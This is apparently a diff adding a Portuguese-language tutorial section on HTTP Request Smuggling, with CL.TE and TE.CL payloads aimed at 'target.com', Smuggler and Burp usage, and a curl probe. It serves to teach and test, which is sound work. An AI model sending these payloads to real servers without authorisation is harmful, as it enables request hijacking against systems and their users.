@@ -398,7 +398,80 @@ Permissions-Policy: camera=(), microphone=(), geolocation=()
 
 ---
 
-**Anterior:** [01-xss-e-csrf.md](01-xss-e-csrf.md)
+## HTTP Request Smuggling
+
+### O que é HTTP Smuggling
+
+HTTP Request Smuggling exploita a forma como **dois servidores** (front-end e back-end) interpretam o limite entre requisições HTTP. Se eles discordam, o atacante pode "esmugglar" uma requisição maliciosa dentro de outra legítima.
+
+**Analogia:** Imagine que você coloca uma carta dentro de um envelope. O carteiro entrega o envelope inteiro. Mas se o destinatário abre o envelope e o carteiro já foi, a carta extra chega sem ser inspecionada.
+
+### Tipos de Smuggling
+
+| Tipo | Como funciona | Severidade |
+|------|--------------|------------|
+| **CL.TE** | Front-end usa Content-Length, back-end usa Transfer-Encoding | Crítica |
+| **TE.CL** | Front-end usa Transfer-Encoding, back-end usa Content-Length | Crítica |
+| **TE.TE** | Ambos usam Transfer-Encoding, mas interpretam diferente | Crítica |
+| **CL.0** | Content-Length: 0 mas há corpo | Alta |
+
+### Payloads
+
+#### CL.TE Smuggling
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+#### TE.CL Smuggling
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+### Ferramentas
+
+```bash
+# Smuggler (Python)
+git clone https://github.com/defparam/smuggler.git
+cd smuggler
+python3 smuggler.py -u http://target.com
+
+# Burp Suite
+# 1. Enviar request para Repeater
+# 2. Modificar Content-Length e Transfer-Encoding
+# 3. Observar se back-end processa requisição extra
+```
+
+### Como Testar
+
+```bash
+# 1. Verificar se front-end e back-end tratam TE/CL diferente
+# 2. Enviar request com TE e CL conflitantes
+# 3. Enviar requisição subsequente para ver se é processada
+
+# Teste básico via curl
+curl -X POST http://target.com/ \
+  -H "Transfer-Encoding: chunked" \
+  -H "Content-Length: 6" \
+  -d "0\r\n\r\nG"
+```
 
 ---
 
